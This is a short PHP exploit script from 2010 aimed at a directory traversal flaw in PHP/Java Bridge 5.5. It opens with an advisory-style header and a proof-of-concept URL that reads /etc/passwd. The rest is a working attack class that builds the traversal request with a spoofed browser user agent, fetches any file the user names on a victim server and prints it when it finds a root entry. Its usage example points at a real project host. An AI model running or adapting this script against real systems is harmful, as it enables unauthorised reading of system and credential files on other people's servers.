/*Title: PHP/Java Bridge 5.5
Date : Sep 6, 2010
Author: Saxtor {Location: South America (Guyana)}
Email: admin@saxtorinc.com
Category::  Web Applications  
Verison: 5.5


suffers a directory traversal
vulnerability.  This vulnerability could allow
attackers to read arbitrary files => 
------------------------------
http://localhost/Javabridge/source.php?source=/etc/passwd
------------------------------
 */
<?php

 /**
 * @param Author   Saxtor Location{South America Guyana}
 * @param Email:   admin@saxtorinc.com
 * @param  Guys please dont beleive in 2012 if you are you are playing a part of getting this world to end :( its all our perception and thinking will cause invent to happen however you will be dead and alive at the same time hehe but for now hack the world! read data 
 */


class Javabridgexploit
{
    /**
     * @param Start 
     */
				public function __construct($argv)
				{
								$this->Exploit($argv);
				}

				public function arguments($argv)
				{
								$_ARG = array();
								foreach ($argv as $arg)
								{
												if (ereg('--[a-zA-Z0-9]*=.*', $arg))
												{
																$str = split("=", $arg);
																$arg = '';
																$key = ereg_replace("--", '', $str[0]);
																for ($i = 1; $i < count($str); $i++)
																{
																				$arg .= $str[$i];
																}
																$_ARG[$key] = $arg;
												} elseif (ereg('-[a-zA-Z0-9]', $arg))
												{
																$arg = ereg_replace("-", '', $arg);
																$_ARG[$arg] = 'true';
												}

								}
								return $_ARG;
				}

				public function ConnectToVictim($url, $path,
								$dir)
				{
								$link = "$url/$path/source.php?source=$dir";

								$y = preg_match_all("/http:\/\//", $link,
												$array);
								if ($y == 1)
								{
												$ch = curl_init();
												curl_setopt($ch, CURLOPT_URL, $link);
												curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
												curl_setopt($ch, CURLOPT_USERAGENT,
																"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)");
												curl_setopt($ch, CURLOPT_REFERER,
																"http://www.x.org");
												$output = curl_exec($ch);


												$x = preg_match_all("%:root:%", $output, $array);
												$guyanarocks = $array[0][0];
												if ($guyanarocks == null)
												{
																echo "No Data Found :(";
												}
												else
												{
																echo $output;
												}


								}
                                else {
                                    die("Invalid Url Must Include http:// example http://php-java-bridge.sourceforge.net");
                                }

				}

				public function Exploit($argv)
				{
								$info = $this->arguments($argv);

								$url  = $info['url'];
								$path = $info['path'];
								$dir  = $info['dir'];

								if ($url == null && $path == null)
								{
												echo "example exploit.php --url=http://php-java-bridge.sourceforge.net --path=examples --dir=/etc/passwd";
								}

								$this->ConnectToVictim($url, $path, $dir);



				}

}

$guyanarules = new Javabridgexploit($argv);

 


?>

      
